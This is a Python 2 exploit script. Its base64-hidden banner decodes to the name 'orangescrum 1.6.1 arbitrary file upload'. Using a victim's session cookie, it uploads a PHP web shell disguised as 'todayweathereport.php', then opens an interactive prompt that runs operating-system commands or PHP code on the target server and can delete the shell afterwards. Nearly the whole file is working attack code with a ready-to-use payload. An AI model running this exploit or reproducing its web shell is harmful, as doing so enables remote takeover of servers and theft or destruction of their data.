#! /usr/bin/python
import sys, getopt, requests, json

filename = "# "+sys.argv[0];

mytext = "IyBvcmFuZ2VzY3J1bSAxLjYuMSBhcmJpdHJhcnkgZmlsZSB1cGxvYWQNCiMgdG9tcGxpeHNlZUB5YWhvby5jby5pZA0KIyANCiMgaG93IHRvIHVzZQ=="
print mytext.decode('base64')
print filename+"IC11IDx1cmw+IC1jIDxjb29raWU+IC1lIDxvc3NoZWxsL3BocD4=".decode('base64')
print "IyBleGFtcGxl".decode('base64')
print filename+"IC11IGh0dHA6Ly9teXNlcnZlci9vcmFuZ2VzY3J1bSAtYyAibXljb29raWUiIC1lIG9zc2hlbGw=".decode('base64')



def isset(variable):
	return variable in locals() or variable in globals()
	
def main(argv):
	global orangeurl, cookie, exptype
	try:
		opts, args = getopt.getopt(argv,"u:c:q:e:",["url=","cookie="])
	except getopt.GetoptError:
		sys.exit(2)
		
	if len(opts)<1: sys.exit()
	for opt, arg in opts:
		if opt in ("-u", "--url"):
			orangeurl = arg
		elif opt in ("-c", "--cookie"):
			cookie = arg
		elif opt in ("-e"):
			exptype = arg
	
	if isset("exptype")==False: exptype="osshell"
	if isset("cookie")==False or isset("orangeurl")==False: 
		print "error : parameters url and cookie is required"
		sys.exit()
		
if __name__ == "__main__":
	main(sys.argv[1:])

def uploadfile():
	global orangeurl, cookie
	print "trying to send exploit...."
	url = orangeurl+"/easycases/fileupload/"
	cookie = cookie
	headers = {
		'Accept': '*/*',
		'Cookie': cookie
	}
	files = {'data[Easycase][case_files]': ('todayweathereport.php', "<?php if(isset($_POST['unlink'])) { unlink(__FILE__); die;}if(isset($_POST['cmd'])) system(base64_decode($_POST['cmd'])); else eval(base64_decode($_POST['eval']));?>")}
	r = requests.post(url, headers=headers, files=files)
	try:
		response = json.loads(r.text)
	except ValueError:
		print("failed")
		sys.exit()
	if response["message"]=="success":
		print "success. enjoy your shell,,,,"
		shell(response["name"])
	else:
		print("failed")
		sys.exit()

def exploit(filename,command,exitprog):
	global orangeurl, exptype
	if exptype=="php": 
		cmd = "eval" 
		data = {'eval':command.encode('base64')}
	else: 
		cmd = "cmd" 
		data = {'cmd':command.encode('base64')}
	if exitprog=="exit": data = {'unlink':'1212'} 
	url = orangeurl+"/app/webroot/files/case_files/"+filename+"?"+cmd+"="+command
	r = requests.post(url,data=data)
	
	if exitprog=="exit": 
		print "goodbye"
		return sys.exit()
		
	print r.text
	shell(filename)

def shell(filename):
	global exptype
	if exptype=="osshell": 
		command = raw_input('os-shell> ') 
	else: 
		command = raw_input('php-eval> ') 
	if command != "exit":
		exploit(filename,command,'')
	else:
		exploit(filename,'','exit')
		return sys.exit()

uploadfile()


